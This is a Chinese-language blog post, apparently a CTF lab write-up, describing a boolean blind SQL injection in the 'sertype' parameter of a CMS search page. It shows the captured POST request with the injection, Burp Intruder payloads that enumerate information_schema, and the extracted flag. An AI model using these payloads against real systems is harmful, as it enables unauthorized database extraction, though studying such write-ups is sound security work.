---
title: "中环 CMS 主页面存在 SQL 注入"
date: 2024-02-19
description: "主页面搜索功能的 post 请求中搜索类型这个变量可以执行 sql 注入的恶意语句"
tags: ["SQL 注入","后端漏洞"]
featured_image: ""
# images is optional, but needed for showing Twitter Card
images: []
categories: "sec"
comment: false
draft: false
---

## 注入点

第一次见到这种注入点。我们在搜索框输入 t 然后抓包，这是为了保证返回的搜索内容不为空。

![sqli7](/images/sqli1/sqli7-4.png)

发现 sertype 变量在加入恒真恒伪后提供了一个布尔盲注点位。
 
    POST /index.php/index/search HTTP/1.1
    Host: 111.9.41.91:53009
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate, br
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 140
    Origin: http://111.9.41.91:53009
    Connection: close
    Referer: http://111.9.41.91:53009/index.php/index/search
    Cookie: admin=admin; pass=21232f297a57a5a743894a0e4a801fc3; PHPSESSID=0gficahl2rfqurrer05uhkdv96
    Upgrade-Insecure-Requests: 1

    sertype=1 and 1=2;#&search=t&sub=%E6%90%9C%E7%B4%A2

![sqli7](/images/sqli1/sqli7-5.png)

## 爆破

开 burp 爆破。

构造如下 payload。

    1 and ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=100;# 

    1 and ascii(substr((select table_name from information_schema.tables where table_schema='flag_db' limit 0,1),1,1))=1;#  

    1 and ascii(substr((select column_name from information_schema.columns where table_schema='flag_db' and table_name='flag' limit 0,1),1,1))=1;#  

    1 and ascii(substr((select value from flag_db.flag limit 0,1),1,1))=1;#  

其中 burp 的 payload 位置如下。

    1 and ascii(substr((select schema_name from information_schema.schemata limit $0$,1),$1$,1))=$1$;# 

得到如下结果。

102 108 97 103 95 100 98 flag_db

102 108 97 103 flag

105 100 id 118 97 108 117 101 value

121 119 97 113 123 73 104 122 120 100 73 72 71 115 106 125 ywaq{IhzxdIHGsj}

得到 flag=ywaq{IhzxdIHGsj}。

其中 burp 结果如下图所示。

![sqli7](/images/sqli1/sqli7-1.png)

![sqli7](/images/sqli1/sqli7-0.png)

![sqli7](/images/sqli1/sqli7-2.png)

![sqli7](/images/sqli1/sqli7-3.png)